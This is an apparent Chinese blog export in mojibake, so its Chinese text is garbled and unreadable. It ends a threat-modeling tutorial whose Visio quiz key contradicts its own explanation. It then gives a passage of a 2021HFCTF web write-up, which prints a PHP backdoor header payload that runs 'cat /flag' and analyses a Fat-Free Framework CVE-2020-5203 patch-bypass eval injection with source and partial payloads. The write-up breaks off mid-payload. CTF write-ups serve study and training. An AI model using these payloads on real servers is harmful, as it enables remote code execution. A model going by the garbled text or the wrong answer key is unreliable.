ç”¨æˆ·å°†åœ¨åˆ†æå…¶æ•°æ®æµå…³ç³»å›¾æ—¶çœ‹åˆ°è¿™äº›æ›´æ”¹ã€‚</p><p><img src="/img/thread-modeling/threatuserview.jpeg" class="lazyload" data-srcset="/img/thread-modeling/threatuserview.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="threatuserview"></p><h4 id="å¨èƒå’Œé£é™©é™ä½ç­–ç•¥"><a href="#å¨èƒå’Œé£é™©é™ä½ç­–ç•¥" class="headerlink" title="å¨èƒå’Œé£é™©é™ä½ç­–ç•¥"></a>å¨èƒå’Œé£é™©é™ä½ç­–ç•¥</h4><p>è¿™ä¸€éƒ¨åˆ†æ˜¯ Threat Modeling Tool çš„æ ¸å¿ƒã€‚ å¨èƒç”Ÿæˆå¼•æ“è€ƒå¯Ÿç‹¬ç«‹å…ƒç´ å’Œå·²è¿æ¥çš„å…ƒç´ ï¼Œä»¥ç¡®å®šç”Ÿæˆå“ªä¸ªå¨èƒã€‚</p><h5 id="å¨èƒç”Ÿæˆçš„åŸç†"><a href="#å¨èƒç”Ÿæˆçš„åŸç†" class="headerlink" title="å¨èƒç”Ÿæˆçš„åŸç†"></a>å¨èƒç”Ÿæˆçš„åŸç†</h5><h6 id="æ­¥éª¤-1-æŒ‡å®šæºå’Œç›®æ ‡"><a href="#æ­¥éª¤-1-æŒ‡å®šæºå’Œç›®æ ‡" class="headerlink" title="æ­¥éª¤ 1 - æŒ‡å®šæºå’Œç›®æ ‡"></a>æ­¥éª¤ 1 - æŒ‡å®šæºå’Œç›®æ ‡</h6><p>å¨èƒç”Ÿæˆå¼•æ“ä½¿ç”¨ç®€å•çš„å¥å­æ¥ç”Ÿæˆå¨èƒã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>ç›®æ ‡ä¸º[å…ƒç´ åç§°]</li><li>æºä¸º[å…ƒç´ åç§°]</li></ul><p>ä½ è¿˜å¯ä»¥åœ¨æ ‡é¢˜å’Œè¯´æ˜ä¸­ä½¿ç”¨å…ƒç´ åç§°ã€‚ æ ¼å¼ä¸ºï¼šâ€œ{target.Name}â€æˆ–â€œ{source.Name}â€</p><h6 id="æ­¥éª¤-2-åˆå¹¶æºå’Œç›®æ ‡"><a href="#æ­¥éª¤-2-åˆå¹¶æºå’Œç›®æ ‡" class="headerlink" title="æ­¥éª¤ 2 - åˆå¹¶æºå’Œç›®æ ‡"></a>æ­¥éª¤ 2 - åˆå¹¶æºå’Œç›®æ ‡</h6><p>ä½ å¯ä»¥ç²¾ç¡®è§„å®šå¦‚ä½•ç”Ÿæˆå¨èƒã€‚ ç”¨ AND OR è¿ç®—ç¬¦ç»„åˆç›®æ ‡ã€æºåŠå…¶å„ä¸ªå±æ€§ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>target.[property name] is â€˜Yesâ€™ <strong>AND</strong> source.[property name] is â€˜Noâ€™</li><li>æµäº¤å‰[ä¿¡ä»»è¾¹ç•Œåç§°]</li></ul><h6 id="æ­¥éª¤-3-ç”Ÿæˆæˆ–å¿½ç•¥å¨èƒ"><a href="#æ­¥éª¤-3-ç”Ÿæˆæˆ–å¿½ç•¥å¨èƒ" class="headerlink" title="æ­¥éª¤ 3 - ç”Ÿæˆæˆ–å¿½ç•¥å¨èƒ"></a>æ­¥éª¤ 3 - ç”Ÿæˆæˆ–å¿½ç•¥å¨èƒ</h6><p>å¨èƒç”Ÿæˆå¼•æ“ä½¿ç”¨ä¸¤ä¸ªå­—æ®µæ¥ç”Ÿæˆæˆ–å¿½ç•¥å¨èƒï¼š</p><ul><li><strong>Include</strong> - å¦‚æœåœ¨æ­¤å­—æ®µä¸­æ·»åŠ çš„å¥å­ä¸º trueï¼Œåˆ™ä¼šç”Ÿæˆå¨èƒ</li><li><strong>Exclude</strong> - å¦‚æœåœ¨æ­¤å­—æ®µä¸­æ·»åŠ çš„å¥å­ä¸º trueï¼Œåˆ™ä¸ä¼šç”Ÿæˆå¨èƒ</li></ul><p>ä¸‹é¢æ˜¯é»˜è®¤æ¨¡æ¿çš„å®é™…ç¤ºä¾‹ï¼Œä»¥ä¾¿å°†è¿™äº›æ­¥éª¤ç»“åˆåœ¨ä¸€èµ·ï¼š</p><ul><li><strong>å¨èƒï¼š</strong> è·¨ç«™ç‚¹è„šæœ¬</li><li><strong>Include:</strong> (target is [Web Server]) <strong>OR</strong> (target is [Web Application])</li><li><strong>Exclude:</strong> (target.[Sanitizes Output] is â€˜Yesâ€™) <strong>AND</strong> (target.[Sanitizes Input] is â€˜Yesâ€™)</li></ul><p>ä»…åœ¨ä»¥ä¸‹æƒ…å†µæ—¶æ‰ä¼šç”Ÿæˆä¸Šè¿°è·¨ç«™ç‚¹è„šæœ¬å¨èƒï¼š</p><ul><li>è¿›ç¨‹æ˜¯ Web æœåŠ¡å™¨æˆ– Web åº”ç”¨ç¨‹åº</li><li>æœªå‡€åŒ–è¾“å…¥å’Œè¾“å‡º</li></ul><p><img src="/img/thread-modeling/includeexclude.jpeg" class="lazyload" data-srcset="/img/thread-modeling/includeexclude.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="includeexclude"></p><div class="note info"><p>Microsoft Threat Modeling Tool æ¨¡æ¿åˆ›å»º ä¸»é¢˜å¾ˆå¤æ‚ï¼Œæœ¬å­¦ä¹ è·¯å¾„ä¸­ä¸ä¼šè¿›è¡Œå……åˆ†è®¨è®ºã€‚</p></div><h4 id="çŸ¥è¯†æ£€æŸ¥-21"><a href="#çŸ¥è¯†æ£€æŸ¥-21" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>Threat Modeling Tool ä¸æä¾›å“ªäº›ä¼˜åŠ¿ï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. ç”Ÿæˆçš„å¨èƒåŸºäºæ•´ä¸ªå…³ç³»å›¾ï¼Œè€Œä¸ä»…æ˜¯æ¯ä¸ªå…ƒç´ æˆ–æ¯æ¬¡äº¤äº’ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. å¯ä»¥æ›´æ”¹å¨èƒã€æ¨¡å…·å’Œæ¨¡å…·å±æ€§ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. ç”Ÿæˆæ¯ä¸ªå¨èƒæ—¶ï¼Œéƒ½ä¼šåŒ…å«é™ä½æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•ã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š<psw>== A ==</psw></p><p>è§£é‡Šï¼š<psw>A. è¯¥å·¥å…·ä»…è€ƒå¯Ÿå„ä¸ªå…ƒç´ å’Œå„æ¬¡äº¤äº’ã€‚B. å¯ä»¥æ›´æ”¹å­—æ®µã€‚C. æŸäº›æ¨¡æ¿åªåŒ…å«å¨èƒï¼Œä½†è¾ƒæ–°ç‰ˆæœ¬ç¡®å®åŒ…å«é£é™©é™ä½ç­–ç•¥ã€‚</psw></p><h3 id="Visio"><a href="#Visio" class="headerlink" title="Visio"></a>Visio</h3><p>Visio å½’ä¸º Microsoft æ‰€æœ‰ï¼Œå…¶åŠŸèƒ½å¼ºå¤§ï¼Œå¯å¸®åŠ©ä»»ä½•äººåˆ›å»ºä¼˜è´¨çš„æµç¨‹å›¾å’Œæ•°æ®æµå…³ç³»å›¾ã€‚</p><h4 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h4><p>Visio æä¾›æ‹–æ”¾åŠŸèƒ½å’Œå…³ç³»å›¾æ‰¹æ³¨åŠŸèƒ½ã€‚ åœ¨ä¸ºç³»ç»Ÿåˆ›å»ºå…³ç³»å›¾æ—¶ï¼Œè¿™ä¸¤ç§åŠŸèƒ½éƒ½å¾ˆæœ‰ç”¨ã€‚</p><h4 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h4><p>è¯¥åº”ç”¨ç¨‹åºä¸æä¾›è‡ªåŠ¨å¨èƒå»ºæ¨¡åŠŸèƒ½ã€‚ å› æ­¤ï¼Œæ²¡æœ‰å¨èƒç”Ÿæˆå¼•æ“æ¥å¸®åŠ©å·¥ç¨‹å¸ˆé›†ä½“è®¨è®ºå¨èƒå’Œé£é™©é™ä½ç­–ç•¥ã€‚</p><div class="note info"><p>å¦‚æœä½¿ç”¨ Visioï¼Œä½ å°†è´Ÿè´£å¯¹æ¯ä¸ªå…ƒç´ å’Œäº¤äº’è¿›è¡Œæ‰‹åŠ¨å¨èƒå»ºæ¨¡ã€‚</p></div><h4 id="çŸ¥è¯†æ£€æŸ¥-22"><a href="#çŸ¥è¯†æ£€æŸ¥-22" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>Visio ä¸æä¾›å“ªäº›ä¼˜åŠ¿ï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. ä½¿ç”¨é»˜è®¤æ¨¡å…·æä¾›æ‹–æ”¾åŠŸèƒ½ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. è¾“å‡ºä¸€ç³»åˆ—ç”Ÿæˆçš„å¨èƒï¼Œå¸®åŠ©å·¥ç¨‹å¸ˆé›†ä½“è®¨è®ºå¯ä»¥å¦‚ä½•é™ä½æˆ–æ¶ˆé™¤é£é™©ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. è®©å·¥ç¨‹å¸ˆå¯ä»¥ä¸ºæ•°æ®æµå›¾è¡¨æ·»åŠ æ‰¹æ³¨ä»¥æä¾›æœåŠ¡ä¸Šä¸‹æ–‡ã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š<psw>== A ==</psw></p><p>è§£é‡Šï¼š<psw>A. å®ƒç¡®å®æä¾›æ‹–æ”¾åŠŸèƒ½ã€‚B. Visio æ²¡æœ‰å¨èƒç”Ÿæˆå¼•æ“ã€‚C. å®ƒæä¾›æ‰¹æ³¨åŠŸèƒ½ã€‚</psw></p><h3 id="å°ç»“-6"><a href="#å°ç»“-6" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>ä½ å¯ä»¥ä½¿ç”¨ä»»ä½•ç”»å¸ƒï¼ˆç‰©ç†çš„æˆ–è™šæ‹Ÿçš„ï¼‰æ¥åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ã€‚ Microsoft çš„å·¥ç¨‹å¸ˆæ¨èå‡ ä¸ªå·¥å…·æ¥å¸®åŠ©ä½ è¿›è¡Œå¨èƒå»ºæ¨¡ã€‚</p><p>ä½ äº†è§£äº†å¯ç”¨äºåˆ›å»ºæ•°æ®æµå…³ç³»å›¾çš„ä¸åŒå·¥å…·ã€‚</p><p>åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å·²ç»å­¦ä¹ äº†ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>è¯¦ç»†äº†è§£äº† Threat Modeling Tool</li><li>è¯¦ç»†äº†è§£äº† Visio</li></ul><div class="note info"><p>è¿˜æœ‰å¾ˆå¤šå…¶ä»–å·¥å…·å¯ä»¥å¸®åŠ©ä½ è§£å†³å¨èƒå»ºæ¨¡éœ€æ±‚ã€‚ å…¶ä¸­æŸäº›å·¥å…·éœ€è¦ä»˜è´¹è®¢é˜…æ‰èƒ½ä½¿ç”¨ï¼Œå¦ä¸€äº›åˆ™å®Œå…¨å¼€æ”¾æºä»£ç ã€‚ ä½ ç”šè‡³å¯ä»¥ä½¿ç”¨ç™½æ¿ï¼Œå…¶å­¦ä¹ éš¾åº¦è¾ƒä½ï¼Œä½†ä»¥å¨èƒå»ºæ¨¡ä¸“ä¸šçŸ¥è¯†ä¸ºä½¿ç”¨å‰æï¼Œå¹¶ä¸”éš¾ä»¥ä¿å­˜ã€‚</p></div><h4 id="äº†è§£è¯¦ç»†ä¿¡æ¯-2"><a href="#äº†è§£è¯¦ç»†ä¿¡æ¯-2" class="headerlink" title="äº†è§£è¯¦ç»†ä¿¡æ¯"></a>äº†è§£è¯¦ç»†ä¿¡æ¯</h4><div class="tag link"><a class="link-card" title="Threat Modeling Tool" href="https://docs.microsoft.com/en-us/azure/security/develop/threat-modeling-tool"><div class="left"><img src="https://s.getwinpcsoft.com/icons/png/128/5216/5216902.png" class="lazyload" data-srcset="https://s.getwinpcsoft.com/icons/png/128/5216/5216902.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/></div><div class="right"><p class="text">Threat Modeling Tool</p><p class="url">https://docs.microsoft.com/en-us/azure/security/develop/threat-modeling-tool</p></div></a></div><div class="tag link"><a class="link-card" title="Visio" href="https://www.microsoft.com/en-us/microsoft-365/visio/flowchart-software"><div class="left"><img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE4k7FT?ver=a8bc" class="lazyload" data-srcset="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE4k7FT?ver=a8bc" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/></div><div class="right"><p class="text">Visio</p><p class="url">https://www.microsoft.com/en-us/microsoft-365/visio/flowchart-software</p></div></a></div><p>å®Œç»“æ’’èŠ±~ ~</p>]]></content>
      
      
      <categories>
          
          <category> SDL </category>
          
          <category> å¨èƒå»ºæ¨¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SDL </tag>
            
            <tag> å¨èƒå»ºæ¨¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021HFCTF Web Writeup (æŒç»­æ›´æ–°)</title>
      <link href="2021/04/03/2021hfctf/"/>
      <url>2021/04/03/2021hfctf/</url>
      
        <content type="html"><![CDATA[<h2 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h2><p>è€ƒç‚¹ï¼šPHPä¾›åº”é“¾æ”»å‡»</p><p>php è¿‘æœŸçˆ†çš„æ¼æ´ï¼Œä¸€å¼€å§‹å°±çœ‹åˆ°äº†ï¼Œ</p><p><img src="/img/2021hfctf/image-20210403190259626.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403190259626.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403190259626"></p><p>å–”ï¼Ÿä½ è¯´è¿™ä¸ªæˆ‘å¯å°±ä¸å›°äº†ï¼Œï¼ˆæˆ‘æ˜¯ä¸ªçˆ±çœ‹æ–°é—»çš„å¥½å­©å­ é€ƒ</p><img src="/img/2021hfctf/image-20210403175010155.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403175010155.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403175010155" style="zoom:50%;" /><p>ä½†æ˜¯ï¼Œï¼ŒUser-Agentt çœ‹æˆäº† User-Agentï¼Œï¼Œæ²¡æˆï¼Œç„¶åè¢«å¦ä¸€ä¸ªåœ°æ–¹å¸ä½äº†çœ¼çƒï¼Œåœ¨æ guestbook.php è‰ã€‚ã€‚</p><p>ç›´åˆ°å®˜æ–¹æ”¾å‡ºæç¤ºï¼Œæˆ‘ä¸ä¿¡é‚ªåœ¨çœ‹äº†ä¸€é</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user-agentt: zerodiumsystem(&quot;cat &#x2F;flag&quot;);</span><br></pre></td></tr></table></figure><p><img src="/img/2021hfctf/image-20210403175138664.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403175138664.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403175138664"></p><h2 id="unsetme"><a href="#unsetme" class="headerlink" title="unsetme"></a>unsetme</h2><p>è€ƒç‚¹ï¼šCVE-2020-5203 è¡¥ä¸ç»•è¿‡</p><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Kickstart the framework</span></span><br><span class="line"><span class="variable">$f3</span>=<span class="keyword">require</span>(<span class="string">&#x27;lib/base.php&#x27;</span>);</span><br><span class="line"><span class="comment">// $f3 = Base::instance();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;set(<span class="string">&#x27;DEBUG&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">float</span>)PCRE_VERSION&lt;<span class="number">8.0</span>)</span><br><span class="line">    trigger_error(<span class="string">&#x27;PCRE version is out of date&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load configuration</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$f3</span>-&gt;<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;run();</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯æœ‰æ•…äº‹</p><p><img src="/img/2021hfctf/image-20210403175307159.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403175307159.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403175307159"></p><p>å¼€å¼€å¿ƒå¿ƒæœ¬åœ°åˆ†æäº†ä¸€æ³¢å¼„å‡ºæ¥äº†ï¼Œçº¿ä¸Šä¸€æ‰“ï¼Œå•¥è¿”å›éƒ½æ²¡= =ï¼Œï¼Œæˆ‘åœ¨æƒ³..</p><p>ä½ è¿™ä¸æ˜¯è€ƒå¯Ÿ CVE-2020-5203 æ ¹æ® 3.7.2çš„ä»£ç ä¿®æ”¹è®°å½• <a href="https://github.com/bcosca/fatfree-core/commit/dae95a0baf3963a9ef87c17cee52f78f77e21829">https://github.com/bcosca/fatfree-core/commit/dae95a0baf3963a9ef87c17cee52f78f77e21829</a> æ¥å†™ 3.7.1 çš„expä¹ˆï¼Ÿ</p><p>ä½ ä¸æ˜¯ã€‚ã€‚3.7.2 å§ï¼Ÿæ™•ï¼Œäºæ˜¯æƒ³åŠæ³•æ‰¾ï¼Œæ‰¾åˆ°äº† changlog æ¥ç¡®å®šç‰ˆæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lib&#x2F;CHANGELOG.md</span><br></pre></td></tr></table></figure><p><img src="/img/2021hfctf/image-20210403194520727.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403194520727.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403194520727"></p><p>è‰ï¼Œæ…¢æ…¢åˆ†æå§ï¼Œå…¶å®æ¼æ´è§¦å‘ç‚¹æ˜¯ç±»ä¼¼çš„</p><p><img src="/img/2021hfctf/image-20210403175851985.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403175851985.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403175851985"></p><p><img src="/img/2021hfctf/image-20210403175931732.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403175931732.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403175931732"></p><p>ç”±ä¸Šä¸¤å›¾ï¼Œ<code>$f3</code> æ˜¯ <code>Base</code> å®ä¾‹ï¼Œè¿™ä¸ªç±»é‡è½½äº† <code>__unset</code> é­”æœ¯æ–¹æ³•ï¼Œç„¶åè¿™ä¸ª <code>$key</code> å‚æ•°æ˜¯å¯æ§çš„</p><p><img src="/img/2021hfctf/image-20210403180041983.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403180041983.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403180041983"></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œè°ƒç”¨ <code>unset($f3-&gt;$a);</code> ä¼šè§¦å‘è¯¥é­”æœ¯æ–¹æ³•ï¼Œè·Ÿè¿› <code>$this-&gt;offsetunset</code> æ–¹æ³•ï¼Œè°ƒç”¨ <code>$this-&gt;clear</code> æ–¹æ³•</p><p><img src="/img/2021hfctf/image-20210403180152159.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403180152159.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403180152159"></p><p>ç»§ç»­è·Ÿè¿›ï¼Œ</p><p><img src="/img/2021hfctf/image-20210403180437548.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403180437548.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403180437548"></p><p>åˆšåˆšè¯´åˆ°ï¼Œè¿™ä¸ª <code>$key</code> å‚æ•°æ˜¯å¯æ§çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ª <code>eval</code> é‡Œçš„ <code>$val</code> æ˜¯å¯æ§çš„</p><p><img src="/img/2021hfctf/image-20210403180630972.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403180630972.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403180630972"></p><p>é—®é¢˜æ˜¯ï¼Œ3.7.2 ç‰ˆæœ¬æ‰“è¿‡è¡¥ä¸ï¼Œ <code>$this-&gt;compile</code>  æ–¹æ³•å’Œä¹‹å‰çš„ä¸åŒï¼Œå¦‚æœç”¨ 3.7.1 ç‰ˆæœ¬çš„exp æ‰“ï¼Œæ–­ç‚¹è°ƒè¯•ï¼Œä¼šå‘ç°æœ€ç»ˆ <code>$val</code> æ„é€ å‡ºæ¥æ˜¯ç±»ä¼¼äº <code>&quot;[&#39;xxx;eval_code&#39;]&quot;</code> ï¼Œæ— è®ºæ€æ ·éƒ½ä¼šè¢«åŒ…æ‹¬åœ¨å¼•å·é‡Œçš„ã€‚</p><p>å…ˆä¼ å…¥ <code>/?a=s</code></p><p><img src="/img/2021hfctf/image-20210403183838570.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403183838570.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403183838570"></p><p>å³è¾¹çº¢æ¡†æ¡†ä½çš„éƒ¨åˆ†å’ŒåŸæœ¬æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œå°±æ˜¯æŠŠå†™åœ¨ä¸€èµ·çš„æå–å‡ºæ¥ï¼Œèµ‹å€¼åˆ°å˜é‡é‡Œæ–¹ä¾¿æŸ¥çœ‹å˜åŒ–</p><p>ç»è¿‡ <code>$this-&gt;compile</code> é¢„å¤„ç†å€¼ <code>$pre</code> ä¸º <code>$hive[&#39;s&#39;]</code> ï¼Œ</p><p>è¦åè¢« <code>eval</code> çš„éƒ¨åˆ† <code>$pinjie</code> ä¸º <code>&quot;unset($this-&gt;hive[&#39;s&#39;]);&quot;</code> ã€‚</p><p>åˆ°è¿™é‡Œæˆ‘ä»¬æ˜ç™½äº†å¤§æ¦‚çš„æ•°æ®æµï¼Œå³è®¾æ³•æ„é€  <code>$_GET[&#39;a&#39;]</code> ä½¿æˆ‘ä»¬çš„æ¶æ„ä»£ç å¯ä»¥è¢« <code>eval</code></p><p>è¿™é‡Œç»•è¿‡æœ‰ä¸¤ä¸ªç‚¹</p><ul><li>æ•°ç»„é—­åˆ</li><li>æ³¨é‡Šé—­åˆå¤šä½™éƒ¨åˆ†</li></ul><p>ç»§ç»­å°è¯•æ„é€ ä¼ å…¥ <code>a=s[]);</code></p><p><img src="/img/2021hfctf/image-20210403184354702.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403184354702.png" 